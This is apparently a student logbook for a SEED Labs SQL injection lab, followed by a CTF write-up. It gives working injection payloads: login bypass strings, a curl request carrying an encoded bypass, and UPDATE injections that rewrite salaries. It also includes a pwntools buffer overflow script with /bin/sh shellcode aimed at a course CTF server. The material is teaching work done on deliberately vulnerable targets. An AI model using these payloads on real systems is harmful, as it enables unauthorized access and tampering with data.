## Week 8 - SQL INJECTION ATTACK LAB

## Task 1  - Get familiar with SQL statements

Following the lab guide, first we followed the rules of setting up an lab environment with docker commands. 
After getting the container id, we were able to run mysql querie to obtain information about the credential tables by using the following sql command: 

```
select * from credential;

OR, if we wanted only Alice information: 

select * from credential where name = "Alice"; 

```
![Terminal print task1](/images/Logbook%208%20images/task1.11.png)


## Task 2.1 - SQL Injection Attack from webpage

This task consists in a typical SQL injection attack, in order to authenticate as an admin, we used the username admin' -- '

So being, we are able to bypass the password validation, since the the original querie will be modified to this one:

```
SELECT id, name, eid, salary, birth, ssn, address, email,
nickname, Password
FROM credential
WHERE name= 'admin' -- ' and Password='$hashed_pwd'

```

As you can see, the password field will be commented by the '--' which allows us to only authenticate using the username field 


![Terminal print task2.1](/images/Logbook%208%20images/task_2.1.png)

![Terminal print task2.1](/images/Logbook%208%20images/task2.1.1.png)



## Task 2.2 - SQL Injection Attack from command line

We executed the following querie, according to the substitution char replacement rules as shown on the lab guide

```
curl 'www.seed-server.com/unsafe_home.php?username=admin%27%3B%23&Password=11'
```

We were able to get acess to the html/css code of the website as shown below

```

<!--
SEED Lab: SQL Injection Education Web plateform
Author: Kailiang Ying
Email: kying@syr.edu
-->

<!--
SEED Lab: SQL Injection Education Web plateform
Enhancement Version 1
Date: 12th April 2018
Developer: Kuber Kohli

Update: Implemented the new bootsrap design. Implemented a new Navbar at the top with two menu options for Home and edit profile, with a button to
logout. The profile details fetched will be displayed using the table class of bootstrap with a dark table head theme.

NOTE: please note that the navbar items should appear only for users and the page with error login message should not have any of these items at
all. Therefore the navbar tag starts before the php tag but it end within the php script adding items as required.
-->

<!DOCTYPE html>
<html lang="en">
<head>
  <!-- Required meta tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <!-- Bootstrap CSS -->
  <link rel="stylesheet" href="css/bootstrap.min.css">
  <link href="css/style_home.css" type="text/css" rel="stylesheet">

  <!-- Browser Tab title -->
  <title>SQLi Lab</title>
</head>
<body>
  <nav class="navbar fixed-top navbar-expand-lg navbar-light" style="background-color: #3EA055;">
    <div class="collapse navbar-collapse" id="navbarTogglerDemo01">
      <a class="navbar-brand" href="unsafe_home.php" ><img src="seed_logo.png" style="height: 40px; width: 200px;" alt="SEEDLabs"></a>

      <ul class='navbar-nav mr-auto mt-2 mt-lg-0' style='padding-left: 30px;'><li class='nav-item active'><a class='nav-link' href='unsafe_home.php'>Home <span class='sr-only'>(current)</span></a></li><li class='nav-item'><a class='nav-link' href='unsafe_edit_frontend.php'>Edit Profile</a></li></ul><button onclick='logout()' type='button' id='logoffBtn' class='nav-link my-2 my-lg-0'>Logout</button></div></nav><div class='container'><br><h1 class='text-center'><b> User Details </b></h1><hr><br><table class='table table-striped table-bordered'><thead class='thead-dark'><tr><th scope='col'>Username</th><th scope='col'>EId</th><th scope='col'>Salary</th><th scope='col'>Birthday</th><th scope='col'>SSN</th><th scope='col'>Nickname</th><th scope='col'>Email</th><th scope='col'>Address</th><th scope='col'>Ph. Number</th></tr></thead><tbody><tr><th scope='row'> Alice</th><td>10000</td><td>20000</td><td>9/20</td><td>10211002</td><td></td><td></td><td></td><td></td></tr><tr><th scope='row'> Boby</th><td>20000</td><td>30000</td><td>4/20</td><td>10213352</td><td></td><td></td><td></td><td></td></tr><tr><th scope='row'> Ryan</th><td>30000</td><td>50000</td><td>4/10</td><td>98993524</td><td></td><td></td><td></td><td></td></tr><tr><th scope='row'> Samy</th><td>40000</td><td>90000</td><td>1/11</td><td>32193525</td><td></td><td></td><td></td><td></td></tr><tr><th scope='row'> Ted</th><td>50000</td><td>110000</td><td>11/3</td><td>32111111</td><td></td><td></td><td></td><td></td></tr><tr><th scope='row'> Admin</th><td>99999</td><td>400000</td><td>3/5</td><td>43254314</td><td></td><td></td><td></td><td></td></tr></tbody></table>      <br><br>
      <div class="text-center">
        <p>
          Copyright &copy; SEED LABs
        </p>
      </div>
    </div>
    <script type="text/javascript">
    function logout(){
      location.href = "logoff.php";
    }
    </script>
  </body>
  </html>

  ```

  Then with this link:

  ![Terminal print linktoacesssite](/images/Logbook%208%20images/linktoacesssite.png)

  We can authenticate in the website as the Admin.

  ![Terminal print imagem_2022-11-17_154655081](/images/Logbook%208%20images/imagem_2022-11-17_154655081.png)

## Task 2.3 - Append a new SQL statement 

For this task, we need to try to run two SQL statements by exploiting the vulnerabilities in the previous tasks. we can try to login as admin and add another user in the same input by trying the following:


![Terminal print task2.3](/images/Logbook%208%20images/task2.3errorsql.png)

We are not able to do it this way, due to this sql statement error.

A few hours later, right when we were this close of jumping into a cliff, we inspected the source code of the website we came across this code:

```
// create a connection
$conn = getDB();
// Sql query to authenticate the user
$sql = "SELECT id, name, eid, salary, birth, ssn, phoneNumber, address, email,nickname,Password
FROM credential
WHERE name= '$input_uname' and Password='$hashed_pwd'";
if (!$result = $conn->query($sql)) {
  echo "</div>";
  echo "</nav>";
  echo "<div class='container text-center'>";
  die('There was an error running the query [' . $conn->error . ']\n');
  echo "</div>";
}

```

We noticed that the bright mind who wrote the website, used the query() function, and we found that its not possible to use multiple queries with a querie() function, it would be necessary to use the multi_querie() function instead.

Check it out here: https://www.php.net/manual/en/mysqli.quickstart.multiple-statement.php

## Task 3 - SQL Injection Attack on UPDATE Statement

## Task 3.1 -  SQL Injection Attack on UPDATE Statement - Update Salary

Here, we used the same username way as used on the 2.1 exercise, instead we used Alice' -- ' to gain acess to Alice's account, 
then we went to "Edit profile", and typed on the nickname field the current info: 

  ![Terminal print acessAliceinformation](/images/Logbook%208%20images/acessAliceinformation.png)

  ![Terminal print AliceInformation](/images/Logbook%208%20images/AliceInformation.png)

Alice thinks that she deserves a raise, so we want to help her. After acessing Alice profile, we can edit the information found in the profile. So let´s say that her new salary is now 30000. To accomplish this, just do as we did in task 2.1 but instead of an authentication, we will uptade her salary. In the field "NickName" we will write "Alice', salary='30000", this will change Alice´s salary to 30000 while setting Alice´s nickname to "Alice".

  ![Terminal print realsalaryupdate](images/Logbook%208%20images/realsalaryupdate.png)

  ![Terminal print realAliceInformation](images/Logbook%208%20images/realAliceInformation.png)




## Task 3.2 - Modify other people’ salary

Alice was still not done. After raising her salary, she wants to reduce her boss's salary, called Boby. Not a very good employee?
This time around it is a little different. We start by, again, going to Alice's profile editor. In the field "NickName" we will write "', salary = 1 WHERE name = 'Boby';#", this will change Boby´s salary to 1 while making is "NickName" empty.

  ![Terminal print Bobysalaryupdate](images/Logbook%208%20images/Bobysalaryupdate.png)

  ![Terminal print BobynewSalary](images/Logbook%208%20images/BobynewSalary.png)






# CTF Write-UP 

## Challenge 1 

Entering the easyvault website, with a login page, we were told that we need to log in as a admin username 

So we used the same method as described on the seed labs, using the following information: 

```
username: admin' -- 
password: c  (can use any character)
```

Once again, by using this username we are commenting the password part of the querie with the  -- symbols.
We are requested still to enter something on the password field due to frontend requeriments but it wont be subjected to any validation. 


## Challenge 2 

For this challenge, we found out that there was a buffer overflow, so we inserted the following exploit:

```
from pwn import *

LOCAL = False

if LOCAL:
    proc = process("./program")
    pause()
else:    
    proc = remote("ctf-fsi.fe.up.pt", 4001)
def get_buff_addr():
    return proc.recvline_contains(b'Your buffer is')[17:25]

buff_addr_str = get_buff_addr().decode('utf-8')
print("BUFF ADDR: " + buff_addr_str)

buff_addr_bytes = bytearray.fromhex(buff_addr_str)
buff_addr_bytes.reverse()

proc.recvuntil(b":")
offset=108
shellcode= b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80"
control_input = shellcode + b'\x90' * (offset-len(shellcode)) + buff_addr_bytes
print(control_input)
proc.sendline(control_input)
proc.interactive()
```

With this exploit, we were able to acess the connection, and by using a simple cat flag.txt the system was able to return us the flag.
![ctf](images/Logbook%208%20images/2.png)

